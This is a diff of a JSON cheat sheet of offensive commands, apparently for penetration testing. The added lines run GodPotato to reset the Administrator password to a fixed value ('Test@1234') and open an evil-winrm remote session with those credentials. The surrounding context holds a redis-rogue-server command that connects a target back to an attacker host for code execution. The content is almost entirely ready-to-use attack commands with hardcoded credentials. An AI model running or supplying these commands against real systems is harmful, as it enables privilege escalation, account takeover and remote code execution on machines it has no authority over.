@@ -39,7 +39,7 @@
   "privilege_escalation": [
     {
       "os": "Windows",
-      "cmd": ".\\GodPotato-NET4.exe -cmd \"cmd /c net user {USER} {NEW_PASS}\"",
+      "cmd": ".\\GodPotato-NET4.exe -cmd \"cmd /c net user Administrator Test@1234\"",
       "description": "Execute the GodPotato-NET4.exe tool to change a target user's password with elevated privileges."
     },
     {
@@ -79,6 +79,11 @@
     {
       "os": "Linux",
       "cmd": "evil-winrm -i {RHOST} -u {USER} -p {PASS}",
+      "description": "Establish a WinRM session to a Windows target for remote command execution using provided credentials."
+    },
+    {
+      "os": "Linux",
+      "cmd": "evil-winrm -i {RHOST} -u Administrator -p Test@1234",
       "description": "Establish a WinRM session to a Windows target for remote command execution using provided credentials."
     },
     {
@@ -159,16 +164,6 @@
     }
   ],
   "miscellaneous_system_control": [
-    {
-      "os": "Windows",
-      "cmd": "if Everyone:(OI)(CI)(F) then # This is a conditional, not an executable command.",
-      "description": "A conditional statement indicating an action to be taken if specific broad permissions are present."
-    },
-    {
-      "os": "Windows",
-      "cmd": "shutdown /r",
-      "description": "Initiate a restart of the computer."
-    },
     {
       "os": "Linux",
       "cmd": "python3 redis-rogue-server.py --rhost {RHOST} --rport 6379 --lhost {LHOST} --lport 6379",
